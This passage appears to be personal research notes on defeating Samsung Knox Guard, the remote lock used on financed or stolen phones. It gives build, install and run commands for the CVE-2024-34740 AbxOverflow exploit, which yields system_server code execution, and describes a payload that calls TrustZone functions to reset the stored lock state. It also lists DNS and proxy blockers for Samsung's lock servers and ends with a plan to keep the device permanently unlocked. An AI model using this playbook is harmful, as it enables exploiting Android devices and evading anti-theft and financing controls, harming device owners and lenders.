   - If we can find a way to call `tz_setTAState(4)` or equivalent, KG would consider itself completed
   - May need to find the right combination of TrustZone calls

### Scenario C: Blocking Samsung Servers

Prevent kgclient from contacting Samsung servers to receive lock commands:

**DNS Blocker** (`/Users/kyin/kg_block_dns.py`):
```bash
# Run on Mac (requires root for port 53)
sudo python3 /Users/kyin/kg_block_dns.py
```

Blocks these domains:
- `us-kcs-api.samsungknox.com`
- `kcs-api.samsungknox.com`
- `eu-kcs-api.samsungknox.com`
- `cn-kcs-api.samsungknox.com`
- `gslb.samsungknox.com`
- `knoxguard.samsungknox.com`
- `knox-guard.samsungknox.com`
- `kgapi.samsungknox.com`

**HTTP Proxy** (`/Users/kyin/kg_block_proxy.py`):
```bash
python3 /Users/kyin/kg_block_proxy.py
# Listens on port 9999
```

Blocks any URL containing: `samsungknox.com`, `knoxguard`, `kcs-api`, `knox-guard`, `kgapi`

---

## Knox Guard Architecture Reference

### Service Structure

```
KnoxGuardSeService (in services.jar, system_server process)
  |-- handleBootCompleted()
  |     |-- checks TA state via KnoxGuardNative.tz_getTAState()
  |     |-- if state == Locked(3): bindAndSetToLockScreen()
  |     |-- if state != Locked(3): skip lock
  |
  |-- KnoxGuardNative (JNI bridge to TrustZone)
  |     |-- tz_getTAState(int) -> KgErrWrapper
  |     |-- tz_unlockScreen(int) -> KgErrWrapper
  |     |-- tz_lockScreen(int) -> KgErrWrapper
  |     |-- tz_userChecking(int) -> KgErrWrapper
  |     |-- tz_resetRPMB(int) -> KgErrWrapper
  |
  |-- IntegritySeUtil (client integrity checking)
  |     |-- checkKGClientIntegrityAndEnableComponentsWithFlag()
  |     |-- checkSignatures() (platform signature validation)
  |     |-- isEnabled() (component enabled check)
  |
  |-- SystemIntentProcessor
  |     |-- handleBootCompleted()
  |     |-- lockSeDevice(context, errorCode)
  |
  |-- KGEventHandler
        |-- ON_BOOT_COMPLETED -> SystemIntentProcessor.handleBootCompleted()
        |-- ON_SETUP_WIZARD_COMPLETED
        |-- ON_USER_PRESENT
        |-- ON_PACKAGE_REPLACED_OR_REMOVED
        |-- ON_PACKAGE_DATA_CLEARED -> lockSeDevice(ERROR_CLIENT_APP_DATA_CLEARED="3001")
```

### Error Codes

| Code | Constant | Meaning |
|------|----------|---------|
| 3001 | ERROR_CLIENT_APP_DATA_CLEARED | kgclient data was cleared |
| 3020 | ERROR_CLIENT_INTEGRITY | Generic integrity failure |
| 3040 | ERROR_CLIENT_INTEGRITY_FOR_CHINA | China-specific integrity failure |
| 8133 | (bitfield) | Abnormal detection -- multiple components disabled |

### Key Constants (from samsung_framework source)

```java
// Permission
KG_PERMISSION = "com.samsung.android.knoxguard.STATUS"
KG_PACKAGE_NAME = "com.samsung.android.kgclient"

// System Properties
KG_SYSTEM_PROPERTY = "knox.kg.state"
KG_OTP_BIT_SYSTEM_PROPERTY = "ro.boot.kg.bit"

// Intent Actions
INTENT_RETRY_LOCK = "com.samsung.android.knoxguard.RETRY_LOCK"
INTENT_KG_PACKAGE_ADDED = "com.samsung.kgclient.android.intent.action.KG_PACKAGE_ADDED"
INTENT_SETUPWIZARD_COMPLETE = "com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE"

// Content Provider
KG_LOG_URI = "content://com.samsung.android.kgclient.statusprovider/CONTENT_LOG"
```

### KG Boot Flow (simplified)

```
Boot -> kernel -> init -> system_server starts
  |
  v
KnoxGuardSeService.onStart()
  |
  v
IntegritySeUtil.checkKGClientIntegrityAndEnableComponentsWithFlag()
  |-- Check kgclient app enabled
  |-- Check 6 components enabled
  |-- Check platform signature match
  |-- Check minimum version code
  |-- If any fail -> compute error bitfield (e.g., 8133)
  |
  v
SystemIntentProcessor.handleBootCompleted()
  |
  v
KnoxGuardNative.tz_getTAState(0) -> read RPMB
  |
  +-- if state == Locked(3):
  |     bindAndSetToLockScreen()
  |     -> full KG lock overlay displayed
  |
  +-- if state == Active(2):
  |     SKIP lock binding
  |     -> phone boots normally (but kgclient may still re-lock via its own receiver)
  |
  +-- if state == Completed(4) or Prenormal(0):
        No action needed, device is free
```

---

## Tool Inventory

### On Mac

| Tool | Location | Purpose |
|------|----------|---------|
| ADB | `/opt/homebrew/bin/adb` | Android Debug Bridge |
| Android SDK | `/opt/homebrew/share/android-commandlinetools` | Build tools, platform |
| Java 17 | `/opt/homebrew/opt/openjdk@17` | Required for Gradle build |
| AbxOverflow | `/Users/kyin/Downloads/AbxOverflow/` | CVE-2024-34740 exploit |
| ADB Enabler APK | `/Users/kyin/adb_enabler/adbenab.apk` | Device Owner for ADB access |
| APK Server Dir | `/Users/kyin/Downloads/serve_apk/` | HTTP server for APK hosting |
| DNS Blocker | `/Users/kyin/kg_block_dns.py` | Blocks Samsung KG domains |
| HTTP Proxy | `/Users/kyin/kg_block_proxy.py` | Blocks Samsung KG HTTPS |
| Research Output 1 | `/Users/kyin/Downloads/AbxOverflow/kg_research_agent_output.txt` | KG service internals research |
| Research Output 2 | `/Users/kyin/Downloads/AbxOverflow/kg_8133_research_output.txt` | 8133 error research |

### Commands Reference

```bash
# Start APK server
cd /Users/kyin/Downloads/serve_apk && python3 -m http.server 8888

# Start DNS blocker (requires root)
sudo python3 /Users/kyin/kg_block_dns.py

# Start HTTP proxy
python3 /Users/kyin/kg_block_proxy.py

# Build AbxOverflow
cd /Users/kyin/Downloads/AbxOverflow
export JAVA_HOME=/opt/homebrew/opt/openjdk@17
./gradlew :droppedapk:assembleRelease && bash utils/moveapk.sh && ./gradlew :app:assembleDebug

# Install exploit app
adb install -r app/build/outputs/apk/debug/app-debug.apk

# Run exploit orchestrator
bash run_exploit.sh

# Rebuild and reinstall droppedapk (preserves UID 1000)
./gradlew :droppedapk:assembleDebug
adb install -r droppedapk/build/outputs/apk/debug/droppedapk-debug.apk

# Launch droppedapk with action
adb shell am start -n com.example.abxoverflow.droppedapk/.MainActivity --ei action 1

# AT modem access
screen /dev/tty.usbmodemRFCW2006DLA2 115200
```

---

## Appendix: Full Source Code

### A. AbxInjector.java (ABX binary format injection)

**File:** `/Users/kyin/Downloads/AbxOverflow/app/src/main/java/com/example/abxoverflow/AbxInjector.java`

This class constructs raw ABX binary tokens that get injected into `install_sessions.xml` via the integer overflow. Key methods:

- `injectSession()` -- creates a fake `<session>` element with attacker-controlled `sessionStageDir`
- `injectInto()` -- pads payload to exact 65536-byte multiple and sets it as a `Checksum` on a `PackageInstaller.Session`
- `endDocument()` -- writes `END_DOCUMENT` token to prevent parsing beyond injection point

The injection works because `BinaryXmlSerializer.attributeBytesBase64()` writes the length as a `short` (2 bytes), so a 65536-byte array has its length truncated to 0. On read, `BinaryXmlPullParser` reads 0 bytes for the "checksum" value, then encounters the actual payload bytes and interprets them as ABX tokens.

### B. Main.java (exploit stages)

**File:** `/Users/kyin/Downloads/AbxOverflow/app/src/main/java/com/example/abxoverflow/Main.java`

- `stage1()` -- creates injection sessions, calls `AbxInjector.injectInto()`, triggers `install_sessions.xml` write
- `stage2()` -- opens tampered sessions, drops APK, patches `packages.xml`, writes `packages-backup.xml`
- `crashSystemServer()` -- uses `Parcelable` chain via `IAlarmManager.set()` to trigger SIGSEGV in system_server

### C. droppedapk/MainActivity.java (KG exploitation payload)

**File:** `/Users/kyin/Downloads/AbxOverflow/droppedapk/src/main/java/com/example/abxoverflow/droppedapk/MainActivity.java`

The v10 build runs a 10-step sequence in `callKnoxGuardService()`:
1. Read TA state (BEFORE)
2. Call `tz_unlockScreen(0)`
3. Call `tz_userChecking(0)`
4. Read TA state (AFTER)
5. Call service-level `unlockScreen()`, `unbindFromLockScreen()`, `setRemoteLockToLockscreen(false)`
6. Unregister `mSystemReceiver` and `mServiceSystemReceiver` to prevent re-lock
7. Call `tz_resetRPMB(0)` (tries both `(int, byte[])` and `(int)` signatures)
8. Attempt `clearDeviceOwner` via DPM (failed on Samsung)
9. Re-enable kgclient via PackageManagerService reflection
10. Set `knox.kg.state` system property to "Completed"

Also includes `onOptionsItemSelected()` handler for self-uninstall that cleans up `<pastSigs>` from `packages.xml` first.

### D. run_exploit.sh (Mac-side orchestrator)

**File:** `/Users/kyin/Downloads/AbxOverflow/run_exploit.sh`

Manages the two-reboot exploit flow from the Mac side:
1. Pre-flight: check ADB connection, install APK if needed, clear old state
2. Stage 1: launch with `--ei stage 1`, poll for `STAGE1_DONE` in log file, wait for reboot
3. Stage 2: after reboot, launch with `--ei stage 2`, poll for `STAGE2_DONE`, wait for reboot
4. Verify: check if `com.example.abxoverflow.droppedapk` is in package list

---

## Key Lessons Learned

1. **KG state lives in TrustZone RPMB** -- software settings (`knox.kg.state`, cached policies) are just cache. They get overwritten on boot from RPMB. To permanently change KG state, you must talk to the TrustZone TA.

2. **`pm disable-user` on kgclient triggers error 8133** -- this is a dynamically computed bitfield, not a stored value. It checks if kgclient + 6 components are enabled on every boot. Don't disable them.

3. **CVE-2024-34740 works on Samsung Android 13 (July 2023 SPL)** -- gives UID 1000 code execution in system_server. The exploit is reliable and repeatable.

4. **Samsung does full reboots, not userspace restarts** -- the original `RebootBackgroundRunner` approach from the PoC doesn't work. Mac-side orchestration is required.

5. **droppedapk can be rebuilt and reinstalled freely** -- as long as you sign with the same debug keystore, `adb install -r` preserves UID 1000 status.

6. **KnoxGuardNative is in services.jar classes3.dex** -- must use the KnoxGuardSeService's classloader to load it, not `Class.forName()`.

7. **`tz_unlockScreen(0)` and `tz_resetRPMB(0)` both succeed** and changed TA state from Locked(3) to Active(2). This is the permanent change we needed.

8. **Re-enabling kgclient clears 8133 but kgclient then re-locks** via its own boot receiver contacting servers or reading cached lock policy.

9. **Active(2) is not the same as Completed(4)** -- Active means KG is provisioned but not currently locking. kgclient may still receive a lock command from Samsung servers and transition back to Locked(3). Completed(4) or Prenormal(0) would be the true unlock.

10. **The winning combination might be:** TA state Active(2) + factory reset (wipes cached policies) + block Samsung servers during initial setup (prevent fresh lock command) + never let kgclient contact Samsung again.

---

## Revision History

| Date | Change |
|------|--------|
| 2026-03-18 | Initial recon, dead ends, AT modem exploration |
| 2026-03-19 AM | QR provisioning, ADB access, failed KG removal attempts |
| 2026-03-19 PM | AbxOverflow exploit, UID 1000 code execution, TrustZone RPMB manipulation |
| 2026-03-19 EVE | TA state changed to Active(2), kgclient re-lock, ADB lost, factory reset initiated |
